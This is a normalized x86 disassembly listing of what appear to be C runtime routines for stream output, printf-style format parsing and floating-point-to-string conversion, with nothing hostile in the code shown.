pop ecx
sub_41f64a
push 0xc
push r--data
call sub_421220
call sub_41e872
mov esi eax
mov eax [ rw-data ]
test [ esi + 0x70 ] eax
je r-xdata
push 0xc
call sub_4251cf
pop ecx
and [ ebp - 0x4 ] 0x0
push [ rw-data ]
add esi 0x6c
push esi
call sub_41f5fd
pop ecx
pop ecx
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_41f6b7
jmp r-xdata
cmp [ esi + 0x6c ] 0x0
je r-xdata
test esi esi
jne r-xdata
call sub_41e872
mov esi [ eax + 0x6c ]
mov eax esi
call sub_421265
retn
push 0x20
call sub_41f36c
sub_41f6c3
mov edi edi
push ebp
mov ebp esp
push ecx
push esi
mov esi [ ebp + 0xc ]
push esi
call sub_428620
mov [ ebp + 0xc ] eax
mov eax [ esi + 0xc ]
pop ecx
test al 0x82
jne r-xdata
test al 0x40
je r-xdata
call sub_41c34a
mov [ eax ] 0x9
push ebx
xor ebx ebx
test al 0x1
je r-xdata
call sub_41c34a
mov [ eax ] 0x22
jmp r-xdata
pop esi
leave
retn
mov eax [ esi + 0xc ]
and eax 0xffffffef
or eax 0x2
mov [ esi + 0xc ] eax
mov [ esi + 0x4 ] ebx
mov [ ebp - 0x4 ] ebx
test eax 0x10c
jne r-xdata
mov [ esi + 0x4 ] ebx
test al 0x10
je r-xdata
or [ esi + 0xc ] 0x20
or eax 0xffffffff
jmp r-xdata
test [ esi + 0xc ] 0x108
push edi
je r-xdata
call sub_42846b
add eax 0x20
cmp esi eax
je r-xdata
or eax 0x20
mov [ esi + 0xc ] eax
or eax 0xffffffff
jmp r-xdata
mov ecx [ esi + 0x8 ]
and eax 0xfffffffe
mov [ esi ] ecx
mov [ esi + 0xc ] eax
xor edi edi
inc edi
push edi
lea eax [ ebp + 0x8 ]
push eax
push [ ebp + 0xc ]
call sub_4282f8
add esp 0xc
mov [ ebp - 0x4 ] eax
mov eax [ esi + 0x8 ]
mov edi [ esi ]
lea ecx [ eax + 0x1 ]
mov [ esi ] ecx
mov ecx [ esi + 0x18 ]
sub edi eax
dec ecx
mov [ esi + 0x4 ] ecx
cmp edi ebx
jle r-xdata
push [ ebp + 0xc ]
call sub_428415
pop ecx
test eax eax
jne r-xdata
call sub_42846b
add eax 0x40
cmp esi eax
jne r-xdata
pop ebx
mov eax [ ebp + 0x8 ]
and eax 0xff
or [ esi + 0xc ] 0x20
or eax 0xffffffff
jmp r-xdata
mov ecx [ ebp + 0xc ]
cmp ecx 0xffffffff
je r-xdata
push edi
push eax
push [ ebp + 0xc ]
call sub_4282f8
add esp 0xc
mov [ ebp - 0x4 ] eax
jmp r-xdata
push esi
call sub_4283cc
pop ecx
pop edi
mov eax rw-data
cmp ecx 0xfffffffe
je r-xdata
mov eax [ esi + 0x8 ]
mov cl [ ebp + 0x8 ]
mov [ eax ] cl
jmp r-xdata
push 0x2
push ebx
push ebx
push ecx
call sub_427b11
and eax edx
add esp 0x10
cmp eax 0xffffffff
je r-xdata
mov eax ecx
and eax 0x1f
mov edx ecx
sar edx 0x5
shl eax 0x6
add eax [ edx * 4 + rw-data ]
jmp r-xdata
cmp [ ebp - 0x4 ] edi
je r-xdata
test [ eax + 0x4 ] 0x20
je r-xdata
sub_41f827
test [ ecx + 0xc ] 0x40
je r-xdata
dec [ ecx + 0x4 ]
js r-xdata
cmp [ ecx + 0x8 ] 0x0
je r-xdata
movsx eax al
push ecx
push eax
call sub_41f6c3
pop ecx
pop ecx
mov edx [ ecx ]
mov [ edx ] al
inc [ ecx ]
movzx eax al
jmp r-xdata
inc [ esi ]
retn
or [ esi ] eax
retn
cmp eax 0xffffffff
jne r-xdata
sub_41f85a
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi eax
mov ebx ecx
call sub_41c34a
test [ edi + 0xc ] 0x40
mov eax [ eax ]
mov [ ebp - 0x4 ] eax
je r-xdata
call sub_41c34a
and [ eax ] 0x0
jmp r-xdata
cmp [ edi + 0x8 ] 0x0
jne r-xdata
test ebx ebx
jg r-xdata
add [ esi ] ebx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov al [ eax ]
mov ecx edi
dec ebx
call sub_41f827
inc [ ebp + 0x8 ]
cmp [ esi ] 0xffffffff
jne r-xdata
call sub_41c34a
cmp [ eax ] 0x0
jne r-xdata
pop esi
pop ebx
leave
retn
call sub_41c34a
cmp [ eax ] 0x2a
jne r-xdata
call sub_41c34a
mov ecx [ ebp - 0x4 ]
mov [ eax ] ecx
mov ecx edi
mov al 0x3f
call sub_41f827
sub_41f8ce
mov edi edi
push ebp
mov ebp esp
sub esp 0x278
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx [ ebp + 0x14 ]
push esi
mov esi [ ebp + 0x8 ]
xor eax eax
push edi
push [ ebp + 0x10 ]
mov edi [ ebp + 0xc ]
lea ecx [ ebp - 0x25c ]
mov [ ebp - 0x240 ] esi
mov [ ebp - 0x228 ] ebx
mov [ ebp - 0x248 ] eax
mov [ ebp - 0x210 ] eax
mov [ ebp - 0x234 ] eax
mov [ ebp - 0x218 ] eax
mov [ ebp - 0x230 ] eax
mov [ ebp - 0x244 ] eax
mov [ ebp - 0x238 ] eax
call sub_41b9dc
test esi esi
jne r-xdata
test [ esi + 0xc ] 0x40
jne r-xdata
call sub_41c34a
mov [ eax ] 0x16
call sub_41efd5
cmp [ ebp - 0x250 ] 0x0
je r-xdata
xor esi esi
cmp edi esi
je r-xdata
push esi
call sub_428620
pop ecx
mov edx rw-data
cmp eax 0xffffffff
je r-xdata
or eax 0xffffffff
jmp r-xdata
mov eax [ ebp - 0x254 ]
and [ eax + 0x70 ] 0xfffffffd
mov dl [ edi ]
xor ecx ecx
mov [ ebp - 0x224 ] esi
mov [ ebp - 0x220 ] esi
mov [ ebp - 0x24c ] esi
mov [ ebp - 0x211 ] dl
test dl dl
je r-xdata
mov ecx edx
cmp eax 0xfffffffe
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_41ac09
leave
retn
cmp [ ebp - 0x250 ] 0x0
je r-xdata
inc edi
mov [ ebp - 0x23c ] edi
cmp [ ebp - 0x224 ] esi
jl r-xdata
cmp eax 0xffffffff
je r-xdata
mov ecx eax
and ecx 0x1f
mov esi eax
sar esi 0x5
shl ecx 0x6
add ecx [ esi * 4 + rw-data ]
jmp r-xdata
mov eax [ ebp - 0x224 ]
mov eax [ ebp - 0x254 ]
and [ eax + 0x70 ] 0xfffffffd
lea eax [ edx - 0x20 ]
cmp al 0x58
ja r-xdata
mov eax edx
cmp eax 0xfffffffe
je r-xdata
test [ ecx + 0x24 ] 0x7f
jne r-xdata
xor eax eax
movsx eax dl
movsx eax [ eax + r--data ]
and eax 0xf
jmp r-xdata
mov ecx eax
and eax 0x1f
sar ecx 0x5
shl eax 0x6
add eax [ ecx * 4 + rw-data ]
jmp r-xdata
mov edi [ ebp - 0x23c ]
mov al [ edi ]
mov [ ebp - 0x211 ] al
test al al
je r-xdata
jmp [ eax * 4 + r-xdata ]
movsx eax [ ecx + eax * 8 + r--data ]
push 0x7
sar eax 0x4
pop ecx
mov [ ebp - 0x260 ] eax
cmp eax ecx
ja r-xdata
test [ eax + 0x24 ] 0x80
jne r-xdata
mov ecx [ ebp - 0x260 ]
mov ebx [ ebp - 0x228 ]
xor esi esi
mov dl al
jmp r-xdata
sub_42047a
mov edi edi
push ebp
mov ebp esp
sub esp 0x20
push ebx
push edi
xor ebx ebx
push 0x7
xor eax eax
pop ecx
lea edi [ ebp - 0x1c ]
mov [ ebp - 0x20 ] ebx
[ edi ]
cmp [ ebp + 0x14 ] ebx
jne r-xdata
mov edi [ ebp + 0x10 ]
push esi
mov esi [ ebp + 0xc ]
cmp edi ebx
je r-xdata
call sub_41c34a
mov [ eax ] 0x16
call sub_41efd5
or eax 0xffffffff
jmp r-xdata
mov eax 0x7fffffff
mov [ ebp - 0x1c ] eax
cmp edi eax
ja r-xdata
cmp esi ebx
jne r-xdata
pop edi
pop ebx
leave
retn
push [ ebp + 0x1c ]
lea eax [ ebp - 0x20 ]
push [ ebp + 0x18 ]
mov [ ebp - 0x14 ] 0x42
push [ ebp + 0x14 ]
mov [ ebp - 0x18 ] esi
push eax
mov [ ebp - 0x20 ] esi
call [ ebp + 0x8 ]
add esp 0x10
mov [ ebp + 0x14 ] eax
cmp esi ebx
je r-xdata
mov [ ebp - 0x1c ] edi
call sub_41c34a
mov [ eax ] 0x16
call sub_41efd5
or eax 0xffffffff
jmp r-xdata
pop esi
cmp eax ebx
jl r-xdata
xor eax eax
cmp [ ebp - 0x1c ] ebx
mov [ esi + edi - 0x1 ] bl
setge al
sub eax 0x2
dec [ ebp - 0x1c ]
js r-xdata
lea eax [ ebp - 0x20 ]
push eax
push ebx
call sub_41f6c3
pop ecx
pop ecx
cmp eax 0xffffffff
je r-xdata
mov eax [ ebp - 0x20 ]
mov [ eax ] bl
jmp r-xdata
mov eax [ ebp + 0x14 ]
jmp r-xdata
sub_420544
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
call sub_41c34a
mov [ eax ] 0x16
call sub_41efd5
or eax 0xffffffff
pop ebp
retn
call sub_41c34a
mov [ eax ] 0x16
jmp r-xdata
cmp [ ebp + 0xc ] 0x0
ja r-xdata
call sub_41efd5
or eax 0xffffffff
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
push sub_428819
call sub_42047a
add esp 0x18
test eax eax
jns r-xdata
cmp eax 0xfffffffe
jne r-xdata
mov [ esi ] 0x0
pop esi
pop ebp
retn
call sub_41c34a
mov [ eax ] 0x22
sub_4205bb
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push esi
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_41b9dc
mov esi [ ebp + 0x8 ]
movsx eax [ esi ]
push eax
call sub_429532
cmp eax 0x65
jmp r-xdata
pop ecx
jne r-xdata
inc esi
movzx eax [ esi ]
push eax
call sub_41be08
test eax eax
movsx eax [ esi ]
push eax
call sub_429532
pop ecx
cmp eax 0x78
jne r-xdata
mov ecx [ ebp - 0x10 ]
mov ecx [ ecx + 0xbc ]
mov ecx [ ecx ]
mov al [ esi ]
mov cl [ ecx ]
mov [ esi ] cl
inc esi
add esi 0x2
mov cl [ esi ]
mov [ esi ] al
mov al cl
mov cl [ esi ]
inc esi
test cl cl
jne r-xdata
pop esi
cmp [ ebp - 0x4 ] cl
je r-xdata
leave
retn
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
sub_42062f
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push esi
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_41b9dc
mov eax [ ebp + 0x8 ]
mov cl [ eax ]
mov esi [ ebp - 0x10 ]
test cl cl
je r-xdata
mov cl [ eax ]
inc eax
test cl cl
je r-xdata
mov edx [ esi + 0xbc ]
mov edx [ edx ]
mov dl [ edx ]
cmp [ ebp - 0x4 ] 0x0
pop esi
je r-xdata
jmp r-xdata
inc eax
mov cl [ eax ]
test cl cl
jne r-xdata
leave
retn
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
mov cl [ eax ]
test cl cl
jne r-xdata
cmp cl dl
je r-xdata
cmp cl 0x65
je r-xdata
mov edx eax
cmp cl 0x45
je r-xdata
dec eax
cmp [ eax ] 0x30
je r-xdata
mov ecx [ esi + 0xbc ]
mov ecx [ ecx ]
push ebx
mov bl [ eax ]
cmp bl [ ecx ]
pop ebx
jne r-xdata
inc eax
mov cl [ edx ]
inc eax
inc edx
mov [ eax ] cl
test cl cl
jne r-xdata
dec eax
sub_4206b1
mov edi edi
push ebp
mov ebp esp
fldz
mov eax [ ebp + 0x8 ]
fcomp [ eax ]
fnstsw ax
test ah 0x41
jpe r-xdata
xor eax eax
pop ebp
retn
xor eax eax
inc eax
pop ebp
retn
sub_4206cd
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
cmp [ ebp + 0x8 ] 0x0
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
je r-xdata
lea eax [ ebp + 0x8 ]
push eax
call sub_429606
mov eax [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
mov [ eax ] ecx
lea eax [ ebp - 0x8 ]
push eax
call sub_42955e
mov ecx [ ebp - 0x8 ]
mov eax [ ebp + 0xc ]
mov [ eax ] ecx
mov ecx [ ebp - 0x4 ]
mov [ eax + 0x4 ] ecx
jmp r-xdata
add esp 0xc
leave
retn
sub_420729
mov edi edi
push esi
mov esi eax
test edi edi
je r-xdata
pop esi
retn
push esi
call sub_41d120
inc eax
push eax
push esi
add esi edi
push esi
call sub_41a460
add esp 0x10
sub_42076e
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
push [ ebp + 0x1c ]
lea ecx [ ebp - 0x10 ]
mov ebx eax
call sub_41b9dc
xor ecx ecx
cmp ebx ecx
jne r-xdata
cmp [ ebp + 0x8 ] ecx
jbe r-xdata
call sub_41c34a
push 0x16
cmp [ ebp + 0xc ] ecx
jle r-xdata
mov eax esi
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
xor eax eax
mov eax [ ebp + 0xc ]
jmp r-xdata
push edi
cmp [ ebp + 0x18 ] cl
je r-xdata
call sub_41c34a
push 0x22
jmp r-xdata
add eax 0x9
cmp [ ebp + 0x8 ] eax
ja r-xdata
mov edi [ ebp + 0x14 ]
cmp [ edi ] 0x2d
mov esi ebx
jne r-xdata
mov edx [ ebp + 0x14 ]
xor eax eax
cmp [ ebp + 0xc ] ecx
setg al
xor ecx ecx
cmp [ edx ] 0x2d
sete cl
mov edi eax
add ecx ebx
mov eax ecx
call sub_420729
pop esi
mov [ eax ] esi
call sub_41efd5
cmp [ ebp - 0x4 ] 0x0
je r-xdata
cmp [ ebp + 0xc ] 0x0
jle r-xdata
mov [ ebx ] 0x2d
lea esi [ ebx + 0x1 ]
xor eax eax
cmp [ ebp + 0x18 ] al
sete al
add eax [ ebp + 0xc ]
add esi eax
cmp [ ebp + 0x8 ] 0xffffffff
jne r-xdata
mov cl [ esi + 0x1 ]
mov eax [ ebp - 0x10 ]
mov [ esi ] cl
mov eax [ eax + 0xbc ]
mov eax [ eax ]
mov al [ eax ]
inc esi
mov [ esi ] al
sub ebx esi
add ebx [ ebp + 0x8 ]
or ebx 0xffffffff
jmp r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_41ef83
int3
lea ecx [ esi + 0x2 ]
cmp [ ebp + 0x10 ] eax
je r-xdata
push r--data
push ebx
push esi
call sub_41e063
add esp 0xc
test eax eax
jne r-xdata
mov eax [ edi + 0xc ]
cmp [ eax ] 0x30
je r-xdata
mov [ esi ] 0x45
test [ rw-data ] 0x1
pop edi
je r-xdata
mov eax [ edi + 0x4 ]
dec eax
jns r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
cmp [ ecx ] 0x30
jne r-xdata
cmp eax 0x64
jl r-xdata
neg eax
mov [ esi + 0x1 ] 0x2d
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
push 0x3
lea eax [ ecx + 0x1 ]
push eax
push ecx
call sub_41a460
add esp 0xc
cmp eax 0xa
jl r-xdata
cdq
push 0x64
pop edi
idiv edi
add [ esi + 0x2 ] al
mov eax edx
pop esi
pop ebx
leave
retn
add [ esi + 0x4 ] al
cdq
push 0xa
pop edi
idiv edi
add [ esi + 0x3 ] al
mov eax edx
sub_4208cf
mov edi edi
push ebp
mov ebp esp
sub esp 0x2c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
mov esi [ ebp + 0x14 ]
push edi
mov edi [ ebp + 0xc ]
push 0x16
pop ebx
push ebx
lea ecx [ ebp - 0x1c ]
push ecx
lea ecx [ ebp - 0x2c ]
push ecx
push [ eax + 0x4 ]
push [ eax ]
call sub_429814
add esp 0x14
test edi edi
jne r-xdata
mov eax [ ebp + 0x10 ]
test eax eax
je r-xdata
call sub_41c34a
mov [ eax ] ebx
call sub_41efd5
mov eax ebx
jmp r-xdata
cmp eax 0xffffffff
jne r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_41ac09
leave
retn
xor ecx ecx
cmp [ ebp - 0x2c ] 0x2d
sete cl
sub eax ecx
xor ecx ecx
test esi esi
setg cl
sub eax ecx
or eax eax
jmp r-xdata
push [ ebp + 0x1c ]
lea eax [ ebp - 0x2c ]
push 0x0
push eax
push [ ebp + 0x18 ]
mov eax edi
push esi
push [ ebp + 0x10 ]
call sub_42076e
add esp 0x18
mov [ edi ] 0x0
jmp r-xdata
lea ecx [ ebp - 0x2c ]
push ecx
lea ecx [ esi + 0x1 ]
push ecx
push eax
xor eax eax
cmp [ ebp - 0x2c ] 0x2d
sete al
xor ecx ecx
test esi esi
setg cl
add eax edi
add ecx eax
push ecx
call sub_4296ae
add esp 0x10
test eax eax
je r-xdata
sub_420996
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_4208cf
add esp 0x18
pop ebp
retn
sub_4209b6
mov edi edi
push ebp
mov ebp esp
sub esp 0x24
push esi
push edi
push [ ebp + 0x1c ]
lea ecx [ ebp - 0x24 ]
mov [ ebp - 0x14 ] 0x3ff
xor edi edi
mov [ ebp - 0x4 ] 0x30
call sub_41b9dc
cmp [ ebp + 0x14 ] edi
jge r-xdata
mov esi [ ebp + 0xc ]
cmp esi edi
jne r-xdata
mov [ ebp + 0x14 ] edi
cmp [ ebp + 0x10 ] edi
jbe r-xdata
call sub_41c34a
push 0x16
mov eax [ ebp + 0x14 ]
add eax 0xb
mov [ esi ] 0x0
cmp [ ebp + 0x10 ] eax
ja r-xdata
mov eax esi
jmp r-xdata
mov eax [ ebp - 0x1c ]
and [ eax + 0x70 ] 0xfffffffd
mov edi [ ebp + 0x8 ]
mov eax [ edi ]
mov [ ebp - 0xc ] eax
mov eax [ edi + 0x4 ]
mov ecx eax
shr ecx 0x14
mov edx 0x7ff
push ebx
and ecx edx
xor ebx ebx
cmp ecx edx
jne r-xdata
call sub_41c34a
push 0x22
jmp r-xdata
pop edi
pop esi
leave
retn
and eax 0x80000000
xor ecx ecx
or ecx eax
je r-xdata
test ebx ebx
jne r-xdata
pop esi
mov [ eax ] esi
call sub_41efd5
cmp [ ebp - 0x18 ] 0x0
je r-xdata
mov ebx [ ebp + 0x18 ]
test ebx ebx
sete al
dec al
and al 0xe0
add al 0x78
neg ebx
sbb ebx ebx
mov [ esi ] 0x30
mov [ esi + 0x1 ] al
mov ecx [ edi + 0x4 ]
and ebx 0xffffffe0
and ecx 0x7ff00000
xor eax eax
add ebx 0x27
xor edx edx
or eax ecx
jne r-xdata
mov [ esi ] 0x2d
inc esi
mov eax [ ebp + 0x10 ]
cmp eax 0xffffffff
jne r-xdata
mov [ esi + 0x2 ] 0x31
add esi 0x3
mov [ esi + 0x2 ] 0x30
mov ecx [ edi + 0x4 ]
mov eax [ edi ]
and ecx 0xfffff
add esi 0x3
or eax ecx
jne r-xdata
add eax 0xfffffffe
or eax eax
jmp r-xdata
mov ecx [ ebp - 0x24 ]
mov ecx [ ecx + 0xbc ]
mov ecx [ ecx ]
mov cl [ ecx ]
mov [ eax ] cl
mov [ eax ] dl
jmp r-xdata
mov [ ebp - 0x14 ] 0x3fe
jmp r-xdata
mov [ ebp - 0x14 ] edx
jmp r-xdata
cmp [ ebx ] 0x2d
jne r-xdata
cmp [ ebp - 0x18 ] 0x0
mov [ esi ] 0x0
je r-xdata
push 0x0
push [ ebp + 0x14 ]
lea ebx [ esi + 0x2 ]
push eax
push ebx
push edi
call sub_420996
add esp 0x14
test eax eax
je r-xdata
mov [ ebp - 0xc ] edx
mov [ ebp - 0x8 ] 0xf0000
cmp eax edx
jbe r-xdata
mov ecx [ edi + 0x4 ]
mov eax [ edi ]
and ecx 0xfffff
mov [ ebp - 0x8 ] ecx
ja r-xdata
mov eax esi
inc esi
mov [ ebp + 0xc ] eax
cmp [ ebp + 0x14 ] edx
jne r-xdata
cmp [ ebp + 0x18 ] 0x0
mov [ esi ] 0x30
sete al
dec al
and al 0xe0
add al 0x78
mov [ esi + 0x1 ] al
push 0x65
add esi 0x2
push esi
call sub_4293f0
pop ecx
pop ecx
test eax eax
je r-xdata
mov [ esi ] 0x2d
inc esi
pop ebx
mov ecx [ ebp - 0x1c ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
jl r-xdata
mov edx [ edi + 0x4 ]
and edx [ ebp - 0x8 ]
mov eax [ edi ]
movsx ecx [ ebp - 0x4 ]
and eax [ ebp - 0xc ]
and edx 0xfffff
call sub_429990
add ax 0x30
movzx eax ax
cmp eax 0x39
jbe r-xdata
cmp [ ebp + 0x14 ] 0x0
jle r-xdata
cmp [ ebp - 0x18 ] 0x0
je r-xdata
cmp [ ebp + 0x18 ] 0x0
sete cl
dec cl
and cl 0xe0
add cl 0x70
mov [ eax ] cl
mov [ eax + 0x3 ] 0x0
jmp r-xdata
mov edx [ edi + 0x4 ]
and edx [ ebp - 0x8 ]
mov eax [ edi ]
movsx ecx [ ebp - 0x4 ]
and eax [ ebp - 0xc ]
and edx 0xfffff
call sub_429990
cmp ax 0x8
jbe r-xdata
mov ecx [ ebp - 0x8 ]
sub [ ebp - 0x4 ] 0x4
mov [ esi ] al
mov eax [ ebp - 0xc ]
shrd eax ecx 0x4
shr ecx 0x4
inc esi
dec [ ebp + 0x14 ]
cmp [ ebp - 0x4 ] 0x0
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] ecx
jge r-xdata
add eax ebx
mov eax [ ebp + 0xc ]
cmp [ eax ] 0x0
jne r-xdata
push [ ebp + 0x14 ]
push 0x30
push esi
call sub_41adb0
add esp 0xc
add esi [ ebp + 0x14 ]
xor eax eax
mov eax [ ebp - 0x1c ]
and [ eax + 0x70 ] 0xfffffffd
lea eax [ esi - 0x1 ]
cmp [ ebp + 0x14 ] 0x0
jle r-xdata
cmp [ ebp + 0x18 ] 0x0
mov cl 0x34
sete al
dec al
and al 0xe0
add al 0x70
mov [ esi ] al
mov eax [ edi ]
mov edx [ edi + 0x4 ]
call sub_429990
xor ebx ebx
and eax 0x7ff
and edx ebx
sub eax [ ebp - 0x14 ]
push ebx
pop ecx
sbb edx ecx
js r-xdata
mov esi eax
mov [ eax ] 0x30
dec eax
jmp r-xdata
cmp cl 0x46
jne r-xdata
mov [ esi + 0x1 ] 0x2d
add esi 0x2
neg eax
adc edx ebx
neg edx
jg r-xdata
mov cl [ eax ]
cmp cl 0x66
je r-xdata
cmp eax [ ebp + 0xc ]
je r-xdata
test edx edx
jl r-xdata
mov ecx 0x3e8
jg r-xdata
mov [ esi + 0x1 ] 0x2b
add esi 0x2
jmp r-xdata
cmp eax ebx
jb r-xdata
inc [ eax - 0x1 ]
mov cl [ eax ]
cmp cl 0x39
jne r-xdata
cmp esi edi
jne r-xdata
jg r-xdata
push ebx
push ecx
push edx
push eax
call sub_4298b0
add al 0x30
mov [ esi ] al
inc esi
mov [ ebp - 0x10 ] edx
mov eax ecx
mov edx ebx
cmp esi edi
jne r-xdata
cmp eax ecx
jb r-xdata
mov edi esi
mov [ esi ] 0x30
cmp edx ebx
jl r-xdata
inc cl
mov [ eax ] cl
jmp r-xdata
add bl 0x3a
mov [ eax ] bl
jmp r-xdata
push 0x0
push 0xa
push edx
push eax
call sub_4298b0
add al 0x30
mov [ esi ] al
mov [ ebp - 0x10 ] edx
inc esi
mov eax ecx
mov [ ebp - 0x10 ] ebx
test edx edx
jl r-xdata
push 0x0
push 0x64
push edx
push eax
call sub_4298b0
add al 0x30
mov [ esi ] al
mov [ ebp - 0x10 ] edx
inc esi
mov eax ecx
mov edx ebx
cmp eax 0x64
jb r-xdata
add al 0x30
mov [ esi ] al
mov [ esi + 0x1 ] 0x0
jg r-xdata
cmp eax 0xa
jb r-xdata
sub_420d2c
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
push edi
push [ ebp + 0x14 ]
mov edi eax
mov esi [ edi + 0x4 ]
mov ebx ecx
lea ecx [ ebp - 0x10 ]
dec esi
call sub_41b9dc
test ebx ebx
jne r-xdata
cmp [ ebp + 0x8 ] 0x0
jbe r-xdata
call sub_41c34a
push 0x16
pop esi
mov [ eax ] esi
call sub_41efd5
cmp [ ebp - 0x4 ] 0x0
je r-xdata
cmp [ ebp + 0x10 ] 0x0
je r-xdata
mov eax esi
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
cmp [ edi ] 0x2d
mov esi ebx
jne r-xdata
cmp esi [ ebp + 0xc ]
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn
mov eax [ edi + 0x4 ]
test eax eax
jg r-xdata
mov [ ebx ] 0x2d
lea esi [ ebx + 0x1 ]
xor eax eax
cmp [ edi ] 0x2d
sete al
add eax esi
mov [ eax + ebx ] 0x30
add esi eax
push esi
lea ebx [ esi + 0x1 ]
call sub_41d120
inc eax
push eax
push esi
push ebx
call sub_41a460
mov [ esi ] 0x30
add esp 0x10
mov esi ebx
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
push esi
lea ebx [ esi + 0x1 ]
call sub_41d120
inc eax
push eax
push esi
push ebx
call sub_41a460
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0xbc ]
mov eax [ eax ]
mov al [ eax ]
mov [ esi ] al
mov edi [ edi + 0x4 ]
add esp 0x10
test edi edi
jns r-xdata
cmp [ ebp + 0xc ] 0x0
jle r-xdata
xor eax eax
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
neg edi
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
mov [ ebp + 0xc ] edi
cmp [ ebp + 0xc ] edi
jl r-xdata
mov edi [ ebp + 0xc ]
mov eax ebx
call sub_420729
push edi
push 0x30
push ebx
call sub_41adb0
add esp 0xc
sub_420e2f
mov edi edi
push ebp
mov ebp esp
sub esp 0x2c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push esi
push edi
mov edi [ ebp + 0xc ]
push 0x16
pop esi
push esi
lea ecx [ ebp - 0x1c ]
push ecx
lea ecx [ ebp - 0x2c ]
push ecx
push [ eax + 0x4 ]
push [ eax ]
call sub_429814
add esp 0x14
test edi edi
jne r-xdata
push ebx
mov ebx [ ebp + 0x10 ]
test ebx ebx
jne r-xdata
call sub_41c34a
mov [ eax ] esi
call sub_41efd5
mov eax esi
jmp r-xdata
or eax 0xffffffff
cmp ebx eax
je r-xdata
call sub_41c34a
mov [ eax ] esi
call sub_41efd5
mov eax esi
jmp r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop esi
call sub_41ac09
leave
retn
mov esi [ ebp + 0x14 ]
lea ecx [ ebp - 0x2c ]
push ecx
mov ecx [ ebp - 0x28 ]
add ecx esi
push ecx
push eax
xor eax eax
cmp [ ebp - 0x2c ] 0x2d
sete al
add eax edi
push eax
call sub_4296ae
add esp 0x10
test eax eax
je r-xdata
xor ecx ecx
cmp [ ebp - 0x2c ] 0x2d
mov eax ebx
sete cl
sub eax ecx
pop ebx
push [ ebp + 0x18 ]
lea eax [ ebp - 0x2c ]
push 0x0
push esi
push ebx
mov ecx edi
call sub_420d2c
add esp 0x10
mov [ edi ] 0x0
jmp r-xdata
sub_420ef0
mov edi edi
push ebp
mov ebp esp
sub esp 0x2c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push esi
mov esi [ ebp + 0xc ]
push edi
push 0x16
pop edi
push edi
lea ecx [ ebp - 0x1c ]
push ecx
lea ecx [ ebp - 0x2c ]
push ecx
push [ eax + 0x4 ]
push [ eax ]
call sub_429814
add esp 0x14
test esi esi
jne r-xdata
mov ecx [ ebp + 0x10 ]
test ecx ecx
je r-xdata
call sub_41c34a
mov [ eax ] edi
call sub_41efd5
mov eax edi
jmp r-xdata
push ebx
mov ebx [ ebp - 0x28 ]
xor eax eax
dec ebx
cmp [ ebp - 0x2c ] 0x2d
sete al
lea edi [ eax + esi ]
cmp ecx 0xffffffff
jne r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop esi
call sub_41ac09
leave
retn
sub ecx eax
or ecx ecx
jmp r-xdata
mov eax [ ebp - 0x28 ]
dec eax
cmp ebx eax
setl cl
cmp eax 0xfffffffc
jl r-xdata
mov [ esi ] 0x0
jmp r-xdata
lea eax [ ebp - 0x2c ]
push eax
push [ ebp + 0x14 ]
push ecx
push edi
call sub_4296ae
add esp 0x10
test eax eax
je r-xdata
push [ ebp + 0x1c ]
lea eax [ ebp - 0x2c ]
push 0x1
push eax
push [ ebp + 0x18 ]
mov eax esi
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
call sub_42076e
add esp 0x18
cmp eax [ ebp + 0x14 ]
jge r-xdata
pop ebx
test cl cl
je r-xdata
push [ ebp + 0x1c ]
lea eax [ ebp - 0x2c ]
push 0x1
push [ ebp + 0x14 ]
mov ecx esi
push [ ebp + 0x10 ]
